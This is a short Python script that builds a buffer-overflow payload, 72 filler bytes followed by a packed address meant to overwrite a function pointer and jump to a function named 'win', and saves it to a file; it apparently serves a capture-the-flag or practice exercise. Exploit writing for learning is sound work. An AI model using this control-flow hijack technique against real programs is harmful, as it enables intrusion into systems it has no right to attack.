import struct

win_address = 0x5555555551a9 # address of the function win

# Create the payload
payload = b'A' * 72  # Fill the buffer (72 bytes to reach fp)
payload += struct.pack('<Q', win_address)  # overwrite fp with the address of the function win

# Save the payload to a file
with open('payload.bin', 'wb') as f:
    f.write(payload)
